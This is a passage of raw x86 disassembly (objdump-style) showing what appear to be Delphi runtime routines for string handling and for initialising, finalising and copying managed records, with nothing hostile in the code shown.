  40225d:	e9 06 ff ff ff       	jmp    0x402168
  402262:	c3                   	ret
  402263:	90                   	nop
  402264:	85 c0                	test   %eax,%eax
  402266:	74 04                	je     0x40226c
  402268:	c3                   	ret
  402269:	90                   	nop
  40226a:	00 00                	add    %al,(%eax)
  40226c:	b8 6a 22 40 00       	mov    $0x40226a,%eax
  402271:	c3                   	ret
  402272:	8b c0                	mov    %eax,%eax
  402274:	85 c0                	test   %eax,%eax
  402276:	74 05                	je     0x40227d
  402278:	8b 40 fc             	mov    -0x4(%eax),%eax
  40227b:	d1 e8                	shr    $1,%eax
  40227d:	c3                   	ret
  40227e:	8b c0                	mov    %eax,%eax
  402280:	53                   	push   %ebx
  402281:	56                   	push   %esi
  402282:	52                   	push   %edx
  402283:	50                   	push   %eax
  402284:	89 d3                	mov    %edx,%ebx
  402286:	31 c0                	xor    %eax,%eax
  402288:	8b 4c 94 10          	mov    0x10(%esp,%edx,4),%ecx
  40228c:	85 c9                	test   %ecx,%ecx
  40228e:	74 03                	je     0x402293
  402290:	03 41 fc             	add    -0x4(%ecx),%eax
  402293:	4a                   	dec    %edx
  402294:	75 f2                	jne    0x402288
  402296:	d1 e8                	shr    $1,%eax
  402298:	e8 43 fe ff ff       	call   0x4020e0
  40229d:	50                   	push   %eax
  40229e:	89 c6                	mov    %eax,%esi
  4022a0:	8b 44 9c 14          	mov    0x14(%esp,%ebx,4),%eax
  4022a4:	89 f2                	mov    %esi,%edx
  4022a6:	85 c0                	test   %eax,%eax
  4022a8:	74 0a                	je     0x4022b4
  4022aa:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4022ad:	01 ce                	add    %ecx,%esi
  4022af:	e8 a4 ef ff ff       	call   0x401258
  4022b4:	4b                   	dec    %ebx
  4022b5:	75 e9                	jne    0x4022a0
  4022b7:	5a                   	pop    %edx
  4022b8:	58                   	pop    %eax
  4022b9:	e8 3a fe ff ff       	call   0x4020f8
  4022be:	5a                   	pop    %edx
  4022bf:	5e                   	pop    %esi
  4022c0:	5b                   	pop    %ebx
  4022c1:	58                   	pop    %eax
  4022c2:	8d 24 94             	lea    (%esp,%edx,4),%esp
  4022c5:	ff e0                	jmp    *%eax
  4022c7:	c3                   	ret
  4022c8:	53                   	push   %ebx
  4022c9:	56                   	push   %esi
  4022ca:	57                   	push   %edi
  4022cb:	89 c6                	mov    %eax,%esi
  4022cd:	89 d7                	mov    %edx,%edi
  4022cf:	39 d0                	cmp    %edx,%eax
  4022d1:	74 72                	je     0x402345
  4022d3:	85 f6                	test   %esi,%esi
  4022d5:	74 51                	je     0x402328
  4022d7:	85 ff                	test   %edi,%edi
  4022d9:	74 54                	je     0x40232f
  4022db:	8b 46 fc             	mov    -0x4(%esi),%eax
  4022de:	8b 57 fc             	mov    -0x4(%edi),%edx
  4022e1:	29 d0                	sub    %edx,%eax
  4022e3:	77 02                	ja     0x4022e7
  4022e5:	01 c2                	add    %eax,%edx
  4022e7:	52                   	push   %edx
  4022e8:	c1 ea 02             	shr    $0x2,%edx
  4022eb:	74 26                	je     0x402313
  4022ed:	8b 0e                	mov    (%esi),%ecx
  4022ef:	8b 1f                	mov    (%edi),%ebx
  4022f1:	39 d9                	cmp    %ebx,%ecx
  4022f3:	75 41                	jne    0x402336
  4022f5:	4a                   	dec    %edx
  4022f6:	74 15                	je     0x40230d
  4022f8:	8b 4e 04             	mov    0x4(%esi),%ecx
  4022fb:	8b 5f 04             	mov    0x4(%edi),%ebx
  4022fe:	39 d9                	cmp    %ebx,%ecx
  402300:	75 34                	jne    0x402336
  402302:	83 c6 08             	add    $0x8,%esi
  402305:	83 c7 08             	add    $0x8,%edi
  402308:	4a                   	dec    %edx
  402309:	75 e2                	jne    0x4022ed
  40230b:	eb 06                	jmp    0x402313
  40230d:	83 c6 04             	add    $0x4,%esi
  402310:	83 c7 04             	add    $0x4,%edi
  402313:	5a                   	pop    %edx
  402314:	83 e2 02             	and    $0x2,%edx
  402317:	74 0b                	je     0x402324
  402319:	66 8b 0e             	mov    (%esi),%cx
  40231c:	66 8b 1f             	mov    (%edi),%bx
  40231f:	66 39 d9             	cmp    %bx,%cx
  402322:	75 21                	jne    0x402345
  402324:	01 c0                	add    %eax,%eax
  402326:	eb 1d                	jmp    0x402345
  402328:	8b 57 fc             	mov    -0x4(%edi),%edx
  40232b:	29 d0                	sub    %edx,%eax
  40232d:	eb 16                	jmp    0x402345
  40232f:	8b 46 fc             	mov    -0x4(%esi),%eax
  402332:	29 d0                	sub    %edx,%eax
  402334:	eb 0f                	jmp    0x402345
  402336:	5a                   	pop    %edx
  402337:	66 39 d9             	cmp    %bx,%cx
  40233a:	75 09                	jne    0x402345
  40233c:	c1 e9 10             	shr    $0x10,%ecx
  40233f:	c1 eb 10             	shr    $0x10,%ebx
  402342:	66 39 d9             	cmp    %bx,%cx
  402345:	5f                   	pop    %edi
  402346:	5e                   	pop    %esi
  402347:	5b                   	pop    %ebx
  402348:	c3                   	ret
  402349:	8d 40 00             	lea    0x0(%eax),%eax
  40234c:	55                   	push   %ebp
  40234d:	8b ec                	mov    %esp,%ebp
  40234f:	53                   	push   %ebx
  402350:	56                   	push   %esi
  402351:	57                   	push   %edi
  402352:	8b f9                	mov    %ecx,%edi
  402354:	8b da                	mov    %edx,%ebx
  402356:	8b f0                	mov    %eax,%esi
  402358:	8b c6                	mov    %esi,%eax
  40235a:	e8 15 ff ff ff       	call   0x402274
  40235f:	83 fb 01             	cmp    $0x1,%ebx
  402362:	7d 04                	jge    0x402368
  402364:	33 db                	xor    %ebx,%ebx
  402366:	eb 07                	jmp    0x40236f
  402368:	4b                   	dec    %ebx
  402369:	3b c3                	cmp    %ebx,%eax
  40236b:	7d 02                	jge    0x40236f
  40236d:	8b d8                	mov    %eax,%ebx
  40236f:	85 ff                	test   %edi,%edi
  402371:	7d 04                	jge    0x402377
  402373:	33 c0                	xor    %eax,%eax
  402375:	eb 08                	jmp    0x40237f
  402377:	2b c3                	sub    %ebx,%eax
  402379:	3b f8                	cmp    %eax,%edi
  40237b:	7d 02                	jge    0x40237f
  40237d:	8b c7                	mov    %edi,%eax
  40237f:	8b d3                	mov    %ebx,%edx
  402381:	03 d2                	add    %edx,%edx
  402383:	03 d6                	add    %esi,%edx
  402385:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402388:	91                   	xchg   %eax,%ecx
  402389:	e8 66 fe ff ff       	call   0x4021f4
  40238e:	5f                   	pop    %edi
  40238f:	5e                   	pop    %esi
  402390:	5b                   	pop    %ebx
  402391:	5d                   	pop    %ebp
  402392:	c2 04 00             	ret    $0x4
  402395:	8d 40 00             	lea    0x0(%eax),%eax
  402398:	85 c0                	test   %eax,%eax
  40239a:	74 4b                	je     0x4023e7
  40239c:	85 d2                	test   %edx,%edx
  40239e:	74 3a                	je     0x4023da
  4023a0:	53                   	push   %ebx
  4023a1:	56                   	push   %esi
  4023a2:	57                   	push   %edi
  4023a3:	89 c6                	mov    %eax,%esi
  4023a5:	89 d7                	mov    %edx,%edi
  4023a7:	8b 4f fc             	mov    -0x4(%edi),%ecx
  4023aa:	d1 e9                	shr    $1,%ecx
  4023ac:	57                   	push   %edi
  4023ad:	8b 56 fc             	mov    -0x4(%esi),%edx
  4023b0:	d1 ea                	shr    $1,%edx
  4023b2:	4a                   	dec    %edx
  4023b3:	78 20                	js     0x4023d5
  4023b5:	66 8b 06             	mov    (%esi),%ax
  4023b8:	83 c6 02             	add    $0x2,%esi
  4023bb:	29 d1                	sub    %edx,%ecx
  4023bd:	7e 16                	jle    0x4023d5
  4023bf:	f2 66 af             	repnz scas %es:(%edi),%ax
  4023c2:	75 11                	jne    0x4023d5
  4023c4:	89 cb                	mov    %ecx,%ebx
  4023c6:	56                   	push   %esi
  4023c7:	57                   	push   %edi
  4023c8:	89 d1                	mov    %edx,%ecx
  4023ca:	f3 66 a7             	repz cmpsw %es:(%edi),%ds:(%esi)
  4023cd:	5f                   	pop    %edi
  4023ce:	5e                   	pop    %esi
  4023cf:	74 0c                	je     0x4023dd
  4023d1:	89 d9                	mov    %ebx,%ecx
  4023d3:	eb ea                	jmp    0x4023bf
  4023d5:	5a                   	pop    %edx
  4023d6:	31 c0                	xor    %eax,%eax
  4023d8:	eb 0a                	jmp    0x4023e4
  4023da:	31 c0                	xor    %eax,%eax
  4023dc:	c3                   	ret
  4023dd:	5a                   	pop    %edx
  4023de:	89 f8                	mov    %edi,%eax
  4023e0:	29 d0                	sub    %edx,%eax
  4023e2:	d1 e8                	shr    $1,%eax
  4023e4:	5f                   	pop    %edi
  4023e5:	5e                   	pop    %esi
  4023e6:	5b                   	pop    %ebx
  4023e7:	c3                   	ret
  4023e8:	53                   	push   %ebx
  4023e9:	56                   	push   %esi
  4023ea:	57                   	push   %edi
  4023eb:	8b f2                	mov    %edx,%esi
  4023ed:	8b f8                	mov    %eax,%edi
  4023ef:	33 db                	xor    %ebx,%ebx
  4023f1:	85 f6                	test   %esi,%esi
  4023f3:	7e 27                	jle    0x40241c
  4023f5:	8b c6                	mov    %esi,%eax
  4023f7:	e8 e4 fc ff ff       	call   0x4020e0
  4023fc:	8b d8                	mov    %eax,%ebx
  4023fe:	8b 07                	mov    (%edi),%eax
  402400:	e8 6f fe ff ff       	call   0x402274
  402405:	85 c0                	test   %eax,%eax
  402407:	7e 13                	jle    0x40241c
  402409:	3b f0                	cmp    %eax,%esi
  40240b:	7d 02                	jge    0x40240f
  40240d:	8b c6                	mov    %esi,%eax
  40240f:	8b c8                	mov    %eax,%ecx
  402411:	03 c9                	add    %ecx,%ecx
  402413:	8b d3                	mov    %ebx,%edx
  402415:	8b 07                	mov    (%edi),%eax
  402417:	e8 3c ee ff ff       	call   0x401258
  40241c:	8b c7                	mov    %edi,%eax
  40241e:	8b d3                	mov    %ebx,%edx
  402420:	e8 d3 fc ff ff       	call   0x4020f8
  402425:	5f                   	pop    %edi
  402426:	5e                   	pop    %esi
  402427:	5b                   	pop    %ebx
  402428:	c3                   	ret
  402429:	8d 40 00             	lea    0x0(%eax),%eax
  40242c:	31 c9                	xor    %ecx,%ecx
  40242e:	53                   	push   %ebx
  40242f:	8a 4a 01             	mov    0x1(%edx),%cl
  402432:	56                   	push   %esi
  402433:	57                   	push   %edi
  402434:	89 c3                	mov    %eax,%ebx
  402436:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  40243a:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  40243e:	8b 16                	mov    (%esi),%edx
  402440:	8b 46 04             	mov    0x4(%esi),%eax
  402443:	01 d8                	add    %ebx,%eax
  402445:	8b 12                	mov    (%edx),%edx
  402447:	b9 01 00 00 00       	mov    $0x1,%ecx
  40244c:	e8 0b 00 00 00       	call   0x40245c
  402451:	83 c6 08             	add    $0x8,%esi
  402454:	4f                   	dec    %edi
  402455:	7f e7                	jg     0x40243e
  402457:	5f                   	pop    %edi
  402458:	5e                   	pop    %esi
  402459:	5b                   	pop    %ebx
  40245a:	c3                   	ret
  40245b:	90                   	nop
  40245c:	85 c9                	test   %ecx,%ecx
  40245e:	0f 84 8a 00 00 00    	je     0x4024ee
  402464:	53                   	push   %ebx
  402465:	56                   	push   %esi
  402466:	57                   	push   %edi
  402467:	89 c3                	mov    %eax,%ebx
  402469:	89 d6                	mov    %edx,%esi
  40246b:	89 cf                	mov    %ecx,%edi
  40246d:	31 d2                	xor    %edx,%edx
  40246f:	8a 06                	mov    (%esi),%al
  402471:	8a 56 01             	mov    0x1(%esi),%dl
  402474:	31 c9                	xor    %ecx,%ecx
  402476:	3c 0a                	cmp    $0xa,%al
  402478:	74 22                	je     0x40249c
  40247a:	3c 0b                	cmp    $0xb,%al
  40247c:	74 1e                	je     0x40249c
  40247e:	3c 0c                	cmp    $0xc,%al
  402480:	74 24                	je     0x4024a6
  402482:	3c 0d                	cmp    $0xd,%al
  402484:	74 33                	je     0x4024b9
  402486:	3c 0e                	cmp    $0xe,%al
  402488:	74 4d                	je     0x4024d7
  40248a:	3c 0f                	cmp    $0xf,%al
  40248c:	74 0e                	je     0x40249c
  40248e:	3c 11                	cmp    $0x11,%al
  402490:	74 0a                	je     0x40249c
  402492:	b0 02                	mov    $0x2,%al
  402494:	5f                   	pop    %edi
  402495:	5e                   	pop    %esi
  402496:	5b                   	pop    %ebx
  402497:	e9 b0 ed ff ff       	jmp    0x40124c
  40249c:	89 0b                	mov    %ecx,(%ebx)
  40249e:	83 c3 04             	add    $0x4,%ebx
  4024a1:	4f                   	dec    %edi
  4024a2:	7f f8                	jg     0x40249c
  4024a4:	eb 45                	jmp    0x4024eb
  4024a6:	89 0b                	mov    %ecx,(%ebx)
  4024a8:	89 4b 04             	mov    %ecx,0x4(%ebx)
  4024ab:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4024ae:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  4024b1:	83 c3 10             	add    $0x10,%ebx
  4024b4:	4f                   	dec    %edi
  4024b5:	7f ef                	jg     0x4024a6
  4024b7:	eb 32                	jmp    0x4024eb
  4024b9:	55                   	push   %ebp
  4024ba:	89 d5                	mov    %edx,%ebp
  4024bc:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4024c0:	89 d8                	mov    %ebx,%eax
  4024c2:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4024c6:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4024ca:	8b 12                	mov    (%edx),%edx
  4024cc:	e8 8b ff ff ff       	call   0x40245c
  4024d1:	4f                   	dec    %edi
  4024d2:	7f e8                	jg     0x4024bc
  4024d4:	5d                   	pop    %ebp
  4024d5:	eb 14                	jmp    0x4024eb
  4024d7:	55                   	push   %ebp
  4024d8:	89 d5                	mov    %edx,%ebp
  4024da:	89 d8                	mov    %ebx,%eax
  4024dc:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4024e0:	89 f2                	mov    %esi,%edx
  4024e2:	e8 45 ff ff ff       	call   0x40242c
  4024e7:	4f                   	dec    %edi
  4024e8:	7f f0                	jg     0x4024da
  4024ea:	5d                   	pop    %ebp
  4024eb:	5f                   	pop    %edi
  4024ec:	5e                   	pop    %esi
  4024ed:	5b                   	pop    %ebx
  4024ee:	c3                   	ret
  4024ef:	90                   	nop
  4024f0:	31 c9                	xor    %ecx,%ecx
  4024f2:	53                   	push   %ebx
  4024f3:	8a 4a 01             	mov    0x1(%edx),%cl
  4024f6:	56                   	push   %esi
  4024f7:	57                   	push   %edi
  4024f8:	89 c3                	mov    %eax,%ebx
  4024fa:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  4024fe:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  402502:	8b 16                	mov    (%esi),%edx
  402504:	8b 46 04             	mov    0x4(%esi),%eax
  402507:	01 d8                	add    %ebx,%eax
  402509:	8b 12                	mov    (%edx),%edx
  40250b:	b9 01 00 00 00       	mov    $0x1,%ecx
  402510:	e8 0f 00 00 00       	call   0x402524
  402515:	83 c6 08             	add    $0x8,%esi
  402518:	4f                   	dec    %edi
  402519:	7f e7                	jg     0x402502
  40251b:	89 d8                	mov    %ebx,%eax
  40251d:	5f                   	pop    %edi
  40251e:	5e                   	pop    %esi
  40251f:	5b                   	pop    %ebx
  402520:	c3                   	ret
  402521:	8d 40 00             	lea    0x0(%eax),%eax
  402524:	83 f9 00             	cmp    $0x0,%ecx
  402527:	0f 84 e2 00 00 00    	je     0x40260f
  40252d:	50                   	push   %eax
  40252e:	53                   	push   %ebx
  40252f:	56                   	push   %esi
  402530:	57                   	push   %edi
  402531:	89 c3                	mov    %eax,%ebx
  402533:	89 d6                	mov    %edx,%esi
  402535:	89 cf                	mov    %ecx,%edi
  402537:	31 d2                	xor    %edx,%edx
  402539:	8a 06                	mov    (%esi),%al
  40253b:	8a 56 01             	mov    0x1(%esi),%dl
  40253e:	3c 0a                	cmp    $0xa,%al
  402540:	74 25                	je     0x402567
  402542:	3c 0b                	cmp    $0xb,%al
  402544:	74 3e                	je     0x402584
  402546:	3c 0c                	cmp    $0xc,%al
  402548:	74 53                	je     0x40259d
  40254a:	3c 0d                	cmp    $0xd,%al
  40254c:	74 5e                	je     0x4025ac
  40254e:	3c 0e                	cmp    $0xe,%al
  402550:	74 78                	je     0x4025ca
  402552:	3c 0f                	cmp    $0xf,%al
  402554:	0f 84 86 00 00 00    	je     0x4025e0
  40255a:	3c 11                	cmp    $0x11,%al
  40255c:	0f 84 8d 00 00 00    	je     0x4025ef
  402562:	e9 99 00 00 00       	jmp    0x402600
  402567:	83 f9 01             	cmp    $0x1,%ecx
  40256a:	89 d8                	mov    %ebx,%eax
  40256c:	7f 0a                	jg     0x402578
  40256e:	e8 4d f5 ff ff       	call   0x401ac0
  402573:	e9 93 00 00 00       	jmp    0x40260b
  402578:	89 ca                	mov    %ecx,%edx
  40257a:	e8 65 f5 ff ff       	call   0x401ae4
  40257f:	e9 87 00 00 00       	jmp    0x40260b
  402584:	83 f9 01             	cmp    $0x1,%ecx
  402587:	89 d8                	mov    %ebx,%eax
  402589:	7f 08                	jg     0x402593
  40258b:	ff 15 24 d0 40 00    	call   *0x40d024
  402591:	eb 78                	jmp    0x40260b
  402593:	89 ca                	mov    %ecx,%edx
  402595:	ff 15 28 d0 40 00    	call   *0x40d028
  40259b:	eb 6e                	jmp    0x40260b
  40259d:	89 d8                	mov    %ebx,%eax
  40259f:	83 c3 10             	add    $0x10,%ebx
  4025a2:	e8 25 04 00 00       	call   0x4029cc
  4025a7:	4f                   	dec    %edi
  4025a8:	7f f3                	jg     0x40259d
  4025aa:	eb 5f                	jmp    0x40260b
  4025ac:	55                   	push   %ebp
  4025ad:	89 d5                	mov    %edx,%ebp
  4025af:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4025b3:	89 d8                	mov    %ebx,%eax
  4025b5:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4025b9:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4025bd:	8b 12                	mov    (%edx),%edx
  4025bf:	e8 60 ff ff ff       	call   0x402524
  4025c4:	4f                   	dec    %edi
  4025c5:	7f e8                	jg     0x4025af
  4025c7:	5d                   	pop    %ebp
  4025c8:	eb 41                	jmp    0x40260b
  4025ca:	55                   	push   %ebp
  4025cb:	89 d5                	mov    %edx,%ebp
  4025cd:	89 d8                	mov    %ebx,%eax
  4025cf:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4025d3:	89 f2                	mov    %esi,%edx
  4025d5:	e8 16 ff ff ff       	call   0x4024f0
  4025da:	4f                   	dec    %edi
  4025db:	7f f0                	jg     0x4025cd
  4025dd:	5d                   	pop    %ebp
  4025de:	eb 2b                	jmp    0x40260b
  4025e0:	89 d8                	mov    %ebx,%eax
  4025e2:	83 c3 04             	add    $0x4,%ebx
  4025e5:	e8 7a 0a 00 00       	call   0x403064
  4025ea:	4f                   	dec    %edi
  4025eb:	7f f3                	jg     0x4025e0
  4025ed:	eb 1c                	jmp    0x40260b
  4025ef:	89 d8                	mov    %ebx,%eax
  4025f1:	89 f2                	mov    %esi,%edx
  4025f3:	83 c3 04             	add    $0x4,%ebx
  4025f6:	e8 cd 09 00 00       	call   0x402fc8
  4025fb:	4f                   	dec    %edi
  4025fc:	7f f1                	jg     0x4025ef
  4025fe:	eb 0b                	jmp    0x40260b
  402600:	5f                   	pop    %edi
  402601:	5e                   	pop    %esi
  402602:	5b                   	pop    %ebx
  402603:	58                   	pop    %eax
  402604:	b0 02                	mov    $0x2,%al
  402606:	e9 41 ec ff ff       	jmp    0x40124c
  40260b:	5f                   	pop    %edi
  40260c:	5e                   	pop    %esi
  40260d:	5b                   	pop    %ebx
  40260e:	58                   	pop    %eax
  40260f:	c3                   	ret
  402610:	31 c9                	xor    %ecx,%ecx
  402612:	53                   	push   %ebx
  402613:	8a 4a 01             	mov    0x1(%edx),%cl
  402616:	56                   	push   %esi
  402617:	57                   	push   %edi
  402618:	89 c3                	mov    %eax,%ebx
  40261a:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  40261e:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  402622:	8b 16                	mov    (%esi),%edx
  402624:	8b 46 04             	mov    0x4(%esi),%eax
  402627:	01 d8                	add    %ebx,%eax
  402629:	8b 12                	mov    (%edx),%edx
  40262b:	b9 01 00 00 00       	mov    $0x1,%ecx
  402630:	e8 0f 00 00 00       	call   0x402644
  402635:	83 c6 08             	add    $0x8,%esi
  402638:	4f                   	dec    %edi
  402639:	7f e7                	jg     0x402622
  40263b:	5f                   	pop    %edi
  40263c:	5e                   	pop    %esi
  40263d:	5b                   	pop    %ebx
  40263e:	c3                   	ret
  40263f:	90                   	nop
  402640:	c3                   	ret
  402641:	8d 40 00             	lea    0x0(%eax),%eax
  402644:	53                   	push   %ebx
  402645:	56                   	push   %esi
  402646:	57                   	push   %edi
  402647:	85 c9                	test   %ecx,%ecx
  402649:	0f 84 b1 00 00 00    	je     0x402700
  40264f:	89 c3                	mov    %eax,%ebx
  402651:	89 d6                	mov    %edx,%esi
  402653:	89 cf                	mov    %ecx,%edi
  402655:	31 d2                	xor    %edx,%edx
  402657:	8a 06                	mov    (%esi),%al
  402659:	8a 56 01             	mov    0x1(%esi),%dl
  40265c:	3c 0a                	cmp    $0xa,%al
  40265e:	74 22                	je     0x402682
  402660:	3c 0b                	cmp    $0xb,%al
  402662:	74 2d                	je     0x402691
  402664:	3c 0c                	cmp    $0xc,%al
  402666:	74 39                	je     0x4026a1
  402668:	3c 0d                	cmp    $0xd,%al
  40266a:	74 44                	je     0x4026b0
  40266c:	3c 0e                	cmp    $0xe,%al
  40266e:	74 5e                	je     0x4026ce
  402670:	3c 0f                	cmp    $0xf,%al
  402672:	74 70                	je     0x4026e4
  402674:	3c 11                	cmp    $0x11,%al
  402676:	74 7b                	je     0x4026f3
  402678:	b0 02                	mov    $0x2,%al
  40267a:	5f                   	pop    %edi
  40267b:	5e                   	pop    %esi
  40267c:	5b                   	pop    %ebx
  40267d:	e9 ca eb ff ff       	jmp    0x40124c
  402682:	8b 03                	mov    (%ebx),%eax
  402684:	83 c3 04             	add    $0x4,%ebx
  402687:	e8 ac f8 ff ff       	call   0x401f38
  40268c:	4f                   	dec    %edi
  40268d:	7f f3                	jg     0x402682
  40268f:	eb 6f                	jmp    0x402700
  402691:	89 d8                	mov    %ebx,%eax
  402693:	83 c3 04             	add    $0x4,%ebx
  402696:	ff 15 20 d0 40 00    	call   *0x40d020
  40269c:	4f                   	dec    %edi
  40269d:	7f f2                	jg     0x402691
  40269f:	eb 5f                	jmp    0x402700
  4026a1:	89 d8                	mov    %ebx,%eax
  4026a3:	83 c3 10             	add    $0x10,%ebx
  4026a6:	e8 29 03 00 00       	call   0x4029d4
  4026ab:	4f                   	dec    %edi
  4026ac:	7f f3                	jg     0x4026a1
  4026ae:	eb 50                	jmp    0x402700
  4026b0:	55                   	push   %ebp
  4026b1:	89 d5                	mov    %edx,%ebp
  4026b3:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4026b7:	89 d8                	mov    %ebx,%eax
  4026b9:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4026bd:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4026c1:	8b 12                	mov    (%edx),%edx
  4026c3:	e8 7c ff ff ff       	call   0x402644
  4026c8:	4f                   	dec    %edi
  4026c9:	7f e8                	jg     0x4026b3
  4026cb:	5d                   	pop    %ebp
  4026cc:	eb 32                	jmp    0x402700
  4026ce:	55                   	push   %ebp
  4026cf:	89 d5                	mov    %edx,%ebp
  4026d1:	89 d8                	mov    %ebx,%eax
  4026d3:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4026d7:	89 f2                	mov    %esi,%edx
  4026d9:	e8 32 ff ff ff       	call   0x402610
  4026de:	4f                   	dec    %edi
  4026df:	7f f0                	jg     0x4026d1
  4026e1:	5d                   	pop    %ebp
  4026e2:	eb 1c                	jmp    0x402700
  4026e4:	8b 03                	mov    (%ebx),%eax
  4026e6:	83 c3 04             	add    $0x4,%ebx
  4026e9:	e8 e6 09 00 00       	call   0x4030d4
  4026ee:	4f                   	dec    %edi
  4026ef:	7f f3                	jg     0x4026e4
  4026f1:	eb 0d                	jmp    0x402700
  4026f3:	8b 03                	mov    (%ebx),%eax
  4026f5:	83 c3 04             	add    $0x4,%ebx
  4026f8:	e8 2f 09 00 00       	call   0x40302c
  4026fd:	4f                   	dec    %edi
  4026fe:	7f f3                	jg     0x4026f3
  402700:	5f                   	pop    %edi
  402701:	5e                   	pop    %esi
  402702:	5b                   	pop    %ebx
  402703:	c3                   	ret
  402704:	53                   	push   %ebx
  402705:	56                   	push   %esi
  402706:	57                   	push   %edi
  402707:	55                   	push   %ebp
  402708:	89 c3                	mov    %eax,%ebx
  40270a:	89 d6                	mov    %edx,%esi
  40270c:	31 c0                	xor    %eax,%eax
  40270e:	8a 41 01             	mov    0x1(%ecx),%al
  402711:	8d 7c 08 0a          	lea    0xa(%eax,%ecx,1),%edi
  402715:	8b 6f fc             	mov    -0x4(%edi),%ebp
  402718:	31 c0                	xor    %eax,%eax
  40271a:	8b 4f f8             	mov    -0x8(%edi),%ecx
  40271d:	51                   	push   %ecx
  40271e:	8b 4f 04             	mov    0x4(%edi),%ecx
  402721:	29 c1                	sub    %eax,%ecx
  402723:	7e 0b                	jle    0x402730
  402725:	89 c2                	mov    %eax,%edx
  402727:	01 f0                	add    %esi,%eax
  402729:	01 da                	add    %ebx,%edx
  40272b:	e8 28 eb ff ff       	call   0x401258
  402730:	8b 47 04             	mov    0x4(%edi),%eax
  402733:	8b 17                	mov    (%edi),%edx
  402735:	8b 12                	mov    (%edx),%edx
  402737:	8a 0a                	mov    (%edx),%cl
  402739:	80 f9 0a             	cmp    $0xa,%cl
  40273c:	74 31                	je     0x40276f
  40273e:	80 f9 0b             	cmp    $0xb,%cl
  402741:	74 3d                	je     0x402780
  402743:	80 f9 0c             	cmp    $0xc,%cl
  402746:	74 49                	je     0x402791
  402748:	80 f9 0d             	cmp    $0xd,%cl
  40274b:	74 55                	je     0x4027a2
  40274d:	80 f9 0e             	cmp    $0xe,%cl
  402750:	74 70                	je     0x4027c2
  402752:	80 f9 0f             	cmp    $0xf,%cl
  402755:	0f 84 80 00 00 00    	je     0x4027db
  40275b:	80 f9 11             	cmp    $0x11,%cl
  40275e:	0f 84 88 00 00 00    	je     0x4027ec
  402764:	b0 02                	mov    $0x2,%al
  402766:	5d                   	pop    %ebp
  402767:	5f                   	pop    %edi
  402768:	5e                   	pop    %esi
  402769:	5b                   	pop    %ebx
  40276a:	e9 dd ea ff ff       	jmp    0x40124c
  40276f:	8b 14 30             	mov    (%eax,%esi,1),%edx
  402772:	01 d8                	add    %ebx,%eax
  402774:	e8 9b f3 ff ff       	call   0x401b14
  402779:	b8 04 00 00 00       	mov    $0x4,%eax
  40277e:	eb 7d                	jmp    0x4027fd
  402780:	8b 14 30             	mov    (%eax,%esi,1),%edx
  402783:	01 d8                	add    %ebx,%eax
  402785:	e8 ba f9 ff ff       	call   0x402144
  40278a:	b8 04 00 00 00       	mov    $0x4,%eax
  40278f:	eb 6c                	jmp    0x4027fd
  402791:	8d 14 30             	lea    (%eax,%esi,1),%edx
  402794:	01 d8                	add    %ebx,%eax
  402796:	e8 29 02 00 00       	call   0x4029c4
  40279b:	b8 10 00 00 00       	mov    $0x10,%eax
  4027a0:	eb 5b                	jmp    0x4027fd
  4027a2:	31 c9                	xor    %ecx,%ecx
  4027a4:	8a 4a 01             	mov    0x1(%edx),%cl
  4027a7:	ff 74 11 02          	push   0x2(%ecx,%edx,1)
  4027ab:	ff 74 11 06          	push   0x6(%ecx,%edx,1)
  4027af:	8b 4c 11 0a          	mov    0xa(%ecx,%edx,1),%ecx
  4027b3:	8b 09                	mov    (%ecx),%ecx
  4027b5:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4027b8:	01 d8                	add    %ebx,%eax
  4027ba:	e8 61 00 00 00       	call   0x402820
  4027bf:	58                   	pop    %eax
  4027c0:	eb 3b                	jmp    0x4027fd
  4027c2:	31 c9                	xor    %ecx,%ecx
  4027c4:	8a 4a 01             	mov    0x1(%edx),%cl
  4027c7:	8b 4c 11 02          	mov    0x2(%ecx,%edx,1),%ecx
  4027cb:	51                   	push   %ecx
  4027cc:	89 d1                	mov    %edx,%ecx
  4027ce:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4027d1:	01 d8                	add    %ebx,%eax
  4027d3:	e8 2c ff ff ff       	call   0x402704
  4027d8:	58                   	pop    %eax
  4027d9:	eb 22                	jmp    0x4027fd
  4027db:	8b 14 30             	mov    (%eax,%esi,1),%edx
  4027de:	01 d8                	add    %ebx,%eax
  4027e0:	e8 97 08 00 00       	call   0x40307c
  4027e5:	b8 04 00 00 00       	mov    $0x4,%eax
  4027ea:	eb 11                	jmp    0x4027fd
  4027ec:	89 d1                	mov    %edx,%ecx
  4027ee:	8b 14 30             	mov    (%eax,%esi,1),%edx
  4027f1:	01 d8                	add    %ebx,%eax
  4027f3:	e8 0c 08 00 00       	call   0x403004
  4027f8:	b8 04 00 00 00       	mov    $0x4,%eax
  4027fd:	03 47 04             	add    0x4(%edi),%eax
  402800:	83 c7 08             	add    $0x8,%edi
  402803:	4d                   	dec    %ebp
  402804:	0f 85 14 ff ff ff    	jne    0x40271e
  40280a:	59                   	pop    %ecx
  40280b:	29 c1                	sub    %eax,%ecx
  40280d:	7e 0a                	jle    0x402819
  40280f:	8d 14 18             	lea    (%eax,%ebx,1),%edx
